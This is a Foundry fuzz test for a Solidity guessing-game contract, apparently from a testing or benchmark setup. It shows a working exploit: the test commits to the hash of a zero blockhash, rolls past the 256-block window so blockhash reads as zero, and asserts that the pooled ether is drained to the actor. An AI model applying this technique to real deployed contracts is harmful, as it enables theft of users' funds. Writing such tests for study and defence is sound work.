pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;

    function setUp() public { c = new C{value: 1 ether}(); }

    function testFuzz_property(address actor) public {
        vm.assume(actor != address(0) && actor != address(c));
        address helper = makeAddr("secondPlayer");

        // Winning guess: choose a target block whose blockhash reads as 0
        // (block more than 256 blocks in the past at settle time).
        vm.roll(1);
        bytes32 winHash = keccak256(abi.encodePacked(bytes32(0)));

        vm.deal(actor, 1 ether);
        vm.prank(actor);
        c.lockInGuess{value: 1 ether}(winHash); // target block = 2

        // Second player funds the pool to 2 ether so a winning payout is coverable.
        vm.deal(helper, 1 ether);
        vm.prank(helper);
        c.lockInGuess{value: 1 ether}(bytes32(uint256(1)));

        // Advance past target block by >256 blocks so blockhash(2) == 0.
        vm.roll(260);

        vm.prank(actor);
        bool ok;
        try c.settle() { ok = true; } catch { ok = false; }

        // Rule: any admissible actor's winning settle is covered by the 2-ether pool
        // and pays out the entire balance, leaving the contract with 0 ether.
        assertTrue(ok && address(c).balance == 0);
    }
}

